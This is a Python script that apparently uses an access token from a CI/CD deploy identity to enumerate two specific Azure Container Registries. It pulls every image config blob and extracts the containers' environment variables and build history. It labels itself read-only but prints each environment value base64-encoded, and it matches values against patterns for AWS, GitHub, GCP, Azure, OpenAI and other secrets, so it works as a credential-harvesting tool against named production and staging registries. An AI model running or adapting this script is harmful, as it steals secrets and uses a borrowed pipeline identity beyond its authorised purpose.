#!/usr/bin/env python3
"""C211-I121712: completion pass of the READ-ONLY ACR data-plane enumeration for the two
registries whose admin user is DISABLED (acrsswrulesprod, acrsswrulesstaging), reached with
an AAD token minted by the SSW.Rules '/deploy' OIDC ARM identity.

Differences from the i121569 probe (which was interrupted after its enumeration):
  * docker v2 manifests are no longer skipped (mediaType filter fixed),
  * /acr/v1/<repo>/_manifests and /v2/<repo>/tags/list are paginated via the Link header,
  * every unique config blob is pulled once (deduped by config digest across repos),
  * a compact C211_I121712_SUMMARY line carries the whole matrix.

Creates / modifies / deletes NOTHING. Every response is a tagged JSON line.
"""
import base64
import hashlib
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
SID = os.environ.get("C211_SID", "b8b18dcf-d83b-47e2-9886-00c2e983629e")
TAG = os.environ.get("C211_TAG", "C211_I121712")
DEADLINE = int(os.environ.get("C211_DEADLINE", "600"))
T0 = time.time()
REGISTRIES = [
    ("acrsswrulesprod", "SSW.Rules"),
    ("acrsswrulesstaging", "SSW.Rules.Staging"),
]
MAX_MANIFEST_PAGES = 20
MAX_TAGS_PAGES = 6
MAX_CONFIGS_TOTAL = 420
ACC = ", ".join([
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.index.v1+json",
])
IMG_TYPES = (
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
)
IDX_TYPES = (
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.index.v1+json",
)
VALUE_PATTERNS = [
    ("aws_akid", re.compile(r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b")),
    ("github_pat", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b")),
    ("github_pat_fine", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("gitlab_pat", re.compile(r"\bglpat-[A-Za-z0-9_-]{18,}\b")),
    ("gcp_sa_json", re.compile(r'"type"\s*:\s*"service_account"')),
    ("gcp_api_key", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("private_key", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    ("azure_secret_text", re.compile(r"(client_secret|ClientSecret|AZURE_CLIENT_SECRET)\s*[=:]\s*\S{16,}")),
    ("sb_conn", re.compile(r"Endpoint=sb://[^\s\"]+sharedaccesskey=", re.I)),
    ("cosmos_key", re.compile(r"AccountEndpoint=https://[^\s\"]+AccountKey=", re.I)),
    ("storage_conn", re.compile(r"DefaultEndpointsProtocol=https?;AccountName=", re.I)),
    ("openai_key", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
    ("jwt", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.")),
]


def emit(obj):
    try:
        print(TAG + " " + json.dumps(obj, default=str)[:14000], flush=True)
    except Exception:
        print(TAG + ' {"step":"emit-error"}', flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=150):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:  # noqa: BLE001
        return -1, "", str(e)


def classify(v):
    return [n for n, rx in VALUE_PATTERNS if rx.search(v)]


def sha(v):
    return hashlib.sha256(v.encode()).hexdigest()


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def http(url, method="GET", headers=None, body=None, timeout=60):
    req = urllib.request.Request(url, data=body, headers=dict(headers or {}), method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers), e.read()[:600]
        except Exception:  # noqa: BLE001
            return e.code, {}, b""
    except Exception as e:  # noqa: BLE001
        return -1, {}, str(e).encode()[:300]


def blob_drop_auth(url, headers, timeout=90):
    req = urllib.request.Request(url, headers=headers)
    try:
        r = OPENER.open(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303, 307, 308):
            loc = e.headers.get("Location")
            if not loc:
                return e.code, b""
            try:
                r2 = urllib.request.urlopen(urllib.request.Request(loc), timeout=180)
                return r2.status, r2.read()
            except urllib.error.HTTPError as e2:
                return e2.code, e2.read()[:300]
            except Exception as e2:  # noqa: BLE001
                return -1, str(e2).encode()[:200]
        try:
            return e.code, e.read()[:300]
        except Exception:  # noqa: BLE001
            return e.code, b""


def next_link(hdrs):
    link = None
    for k, v in (hdrs or {}).items():
        if k.lower() == "link":
            link = v
            break
    if not link:
        return None
    m = re.search(r"<([^>]+)>\s*;\s*rel=\"?next\"?", link)
    if not m:
        return None
    u = m.group(1)
    if u.startswith("/"):
        return u
    if u.startswith("http://") or u.startswith("https://"):
        return u
    return "/" + u


def acr_exchange(regf, arm_tok, tenant):
    body = urllib.parse.urlencode({
        "grant_type": "access_token", "service": regf, "tenant": tenant,
        "access_token": arm_tok,
    }).encode()
    return http(f"https://{regf}/oauth2/exchange", method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body)


def acr_token(regf, refresh, scope):
    body = urllib.parse.urlencode({
        "grant_type": "refresh_token", "service": regf, "scope": scope,
        "refresh_token": refresh,
    }).encode()
    st, hd, b = http(f"https://{regf}/oauth2/token", method="POST",
                     headers={"Content-Type": "application/x-www-form-urlencoded"}, body=body)
    if st != 200:
        return None
    try:
        return json.loads(b).get("access_token")
    except Exception:  # noqa: BLE001
        return None


def main():
    rc, out, err = run(["az", "account", "show", "--output", "json"], timeout=120)
    acct = {}
    if rc == 0:
        try:
            acct = json.loads(out)
        except Exception:  # noqa: BLE001
            acct = {}
    emit({"step": "az-account", "rc": rc, "name": acct.get("name"), "id": acct.get("id"),
          "tenantId": acct.get("tenantId"), "user": (acct.get("user") or {}).get("name")})
    rc, out, err = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=180)
    arm = None
    if rc == 0:
        try:
            arm = json.loads(out).get("accessToken")
        except Exception:  # noqa: BLE001
            arm = None
    emit({"step": "arm-token", "rc": rc, "has_token": bool(arm), "err": err[:200]})
    tenant = acct.get("tenantId") or ""
    if not arm:
        emit({"step": "ABORT", "reason": "no ARM token"})
        return

    pulled = {}          # config digest -> info
    env_names = {}
    matches = []
    registry_matrix = {}
    truncated = False
    total_manifests = 0
    total_image_manifests = 0

    for reg, rg in REGISTRIES:
        regf = f"{reg}.azurecr.io"
        rmat = {"repos": {}, "catalog_http": None, "exchange_http": None, "configs_pulled": 0}
        st, hd, body = acr_exchange(regf, arm, tenant)
        rmat["exchange_http"] = st
        emit({"step": "acr-exchange", "registry": regf, "http": st,
              "body": body[:160].decode(errors="replace")})
        refresh = None
        if st == 200:
            try:
                refresh = json.loads(body).get("refresh_token")
            except Exception:  # noqa: BLE001
                refresh = None
        if not refresh:
            st2, out2, err2 = run(["az", "acr", "login", "-n", reg, "--expose-token", "--output", "json"], timeout=180)
            emit({"step": "az-acr-expose-token", "registry": reg, "rc": st2, "err": err2[:160]})
            continue
        cat_tok = acr_token(regf, refresh, "registry:catalog:*")
        emit({"step": "acr-catalog-token", "registry": regf, "has_token": bool(cat_tok)})
        if not cat_tok:
            continue
        repos = []
        url = f"https://{regf}/v2/_catalog?n=100"
        pages = 0
        while url and pages < 5:
            st, hd, body = http(url, headers={"Authorization": "Bearer " + cat_tok})
            rmat["catalog_http"] = st
            if st != 200:
                break
            try:
                repos.extend(json.loads(body).get("repositories") or [])
            except Exception:  # noqa: BLE001
                pass
            nl = next_link(hd)
            url = (f"https://{regf}{nl}" if nl and nl.startswith("/") else nl)
            pages += 1
        emit({"step": "catalog", "registry": reg, "http": rmat["catalog_http"], "n": len(repos), "repos": repos[:50]})
        for repo in repos:
            rmat["repos"][repo] = {"manifests": 0, "image_manifests": 0, "indexes": 0,
                                   "configs_unique": 0, "tags": 0, "manifest_pages": 0}
            if left() < 45:
                rmat["repos"][repo]["skipped"] = "deadline"
                continue
            rt = acr_token(regf, refresh, f"repository:{repo}:pull")
            if not rt:
                rmat["repos"][repo]["skipped"] = "no-repo-token"
                continue
            man = []
            url = f"https://{regf}/acr/v1/{repo}/_manifests?n=100"
            pages = 0
            while url and pages < MAX_MANIFEST_PAGES:
                st, hd, body = http(url, headers={"Authorization": "Bearer " + rt})
                if st != 200:
                    break
                try:
                    man.extend(json.loads(body).get("manifests") or [])
                except Exception:  # noqa: BLE001
                    pass
                nl = next_link(hd)
                url = (f"https://{regf}{nl}" if nl and nl.startswith("/") else nl)
                pages += 1
            rmat["repos"][repo]["manifest_pages"] = pages
            rmat["repos"][repo]["manifests"] = len(man)
            total_manifests += len(man)
            tags = []
            url = f"https://{regf}/v2/{repo}/tags/list?n=100"
            pages = 0
            while url and pages < MAX_TAGS_PAGES:
                st, hd, body = http(url, headers={"Authorization": "Bearer " + rt})
                if st != 200:
                    break
                try:
                    tags.extend(json.loads(body).get("tags") or [])
                except Exception:  # noqa: BLE001
                    pass
                nl = next_link(hd)
                url = (f"https://{regf}{nl}" if nl and nl.startswith("/") else nl)
                pages += 1
            rmat["repos"][repo]["tags"] = len(tags)
            emit({"step": "repo-inventory", "registry": reg, "repo": repo,
                  "manifests": len(man), "tags": len(tags)})
            targets = []
            for m in man:
                mt = m.get("mediaType") or ""
                if mt in IMG_TYPES:
                    targets.append(m.get("digest"))
                elif mt in IDX_TYPES:
                    rmat["repos"][repo]["indexes"] += 1
                    targets.append(m.get("digest"))
            seen_dg = set()
            for dg in targets:
                if dg in seen_dg:
                    continue
                seen_dg.add(dg)
                if left() < 40:
                    rmat["repos"][repo]["skipped_tail"] = True
                    break
                st, hd, body = http(f"https://{regf}/v2/{repo}/manifests/{dg}",
                                    headers={"Authorization": "Bearer " + rt, "Accept": ACC})
                if st != 200:
                    emit({"step": "manifest-get", "registry": reg, "repo": repo,
                          "digest": dg, "http": st, "err": body[:140].decode(errors="replace")})
                    continue
                try:
                    mj = json.loads(body)
                except Exception:  # noqa: BLE001
                    continue
                mt = mj.get("mediaType") or ""
                if mt in IDX_TYPES or "index" in mt:
                    kids = mj.get("manifests") or []
                    chosen = None
                    for c in kids:
                        if (c.get("platform") or {}).get("architecture") == "amd64":
                            chosen = c.get("digest")
                            break
                    if not chosen and kids:
                        chosen = kids[0].get("digest")
                    if not chosen:
                        continue
                    st2, hd2, body2 = http(f"https://{regf}/v2/{repo}/manifests/{chosen}",
                                           headers={"Authorization": "Bearer " + rt, "Accept": ACC})
                    if st2 != 200:
                        emit({"step": "child-get", "registry": reg, "repo": repo,
                              "digest": chosen, "http": st2, "err": body2[:140].decode(errors="replace")})
                        continue
                    try:
                        mj = json.loads(body2)
                    except Exception:  # noqa: BLE001
                        continue
                rmat["repos"][repo]["image_manifests"] += 1
                total_image_manifests += 1
                cfgd = (mj.get("config") or {}).get("digest")
                if not cfgd:
                    continue
                rmat["repos"][repo]["configs_unique"] += 1
                if cfgd in pulled:
                    continue
                if len(pulled) >= MAX_CONFIGS_TOTAL:
                    rmat["budget_reached"] = True
                    truncated = True
                    continue
                if left() < 30:
                    rmat["repos"][repo]["skipped_tail"] = True
                    break
                st3, data = blob_drop_auth(f"https://{regf}/v2/{repo}/blobs/{cfgd}",
                                           headers={"Authorization": "Bearer " + rt})
                if st3 != 200:
                    pulled[cfgd] = {"blob_http": st3}
                    emit({"step": "config-blob", "registry": reg, "repo": repo,
                          "config": cfgd, "http": st3, "err": data[:120].decode(errors="replace")})
                    continue
                rmat["configs_pulled"] += 1
                try:
                    cj = json.loads(data)
                except Exception:  # noqa: BLE001
                    pulled[cfgd] = {"blob_http": 200, "parse": "fail", "len": len(data)}
                    continue
                env = []
                for kv in (cj.get("config") or {}).get("Env") or []:
                    if "=" in kv:
                        n, v = kv.split("=", 1)
                    else:
                        n, v = kv, ""
                    m = classify(v)
                    env.append({"name": n, "len": len(v), "sha256": sha(v),
                                "b64": base64.b64encode(v.encode()).decode()[:400], "matches": m})
                    env_names[n] = env_names.get(n, 0) + 1
                    if m:
                        matches.append({"registry": reg, "repo": repo, "config": cfgd,
                                        "name": n, "classes": m, "len": len(v), "sha256": sha(v)})
                hist = []
                for h in cj.get("history") or []:
                    cb = (h.get("created_by") or "")[:400]
                    for mm in classify(cb):
                        matches.append({"registry": reg, "repo": repo, "config": cfgd,
                                        "history_match": mm, "sha256": sha(cb)})
                    hist.append(cb)
                pulled[cfgd] = {"blob_http": 200, "len": len(data), "env_count": len(env)}
                emit({"step": "config", "registry": reg, "repo": repo, "config": cfgd,
                      "len": len(data), "env_count": len(env), "env": env,
                      "history": hist, "labels": cj.get("container_config", {}).get("Labels") or {},
                      "user": (cj.get("config") or {}).get("User", ""),
                      "created": cj.get("created")})
            emit({"step": "repo-done", "registry": reg, "repo": repo,
                  "manifests": rmat["repos"][repo]["manifests"],
                  "image_manifests": rmat["repos"][repo]["image_manifests"],
                  "configs_unique": rmat["repos"][repo]["configs_unique"],
                  "left_s": round(left(), 1)})
        rmat["configs_pulled"] = sum(1 for k in pulled)
        registry_matrix[reg] = rmat
        emit({"step": "registry-done", "registry": reg, "repos": len(rmat["repos"]),
              "manifests": sum(v["manifests"] for v in rmat["repos"].values()),
              "configs_total_so_far": len(pulled), "left_s": round(left(), 1)})

    summary = {
        "step": "SUMMARY",
        "registries": list(registry_matrix.keys()),
        "per_registry": {r: {"repos": {k: dict(v) for k, v in m["repos"].items()},
                             "catalog_http": m["catalog_http"],
                             "exchange_http": m["exchange_http"]}
                         for r, m in registry_matrix.items()},
        "manifests_total": total_manifests,
        "image_manifests_total": total_image_manifests,
        "unique_configs_pulled": len(pulled),
        "config_blob_http": {str(k): sum(1 for v in pulled.values() if v.get("blob_http") == k)
                             for k in set(v.get("blob_http") for v in pulled.values())},
        "env_names": dict(sorted(env_names.items(), key=lambda x: -x[1])),
        "matches": matches,
        "truncated": truncated,
        "elapsed_s": round(time.time() - T0, 1),
        "matrix_sha256": sha(json.dumps({"pulled": sorted(pulled.keys()),
                                         "env_names": env_names}, sort_keys=True)),
    }
    emit(summary)


if __name__ == "__main__":
    main()
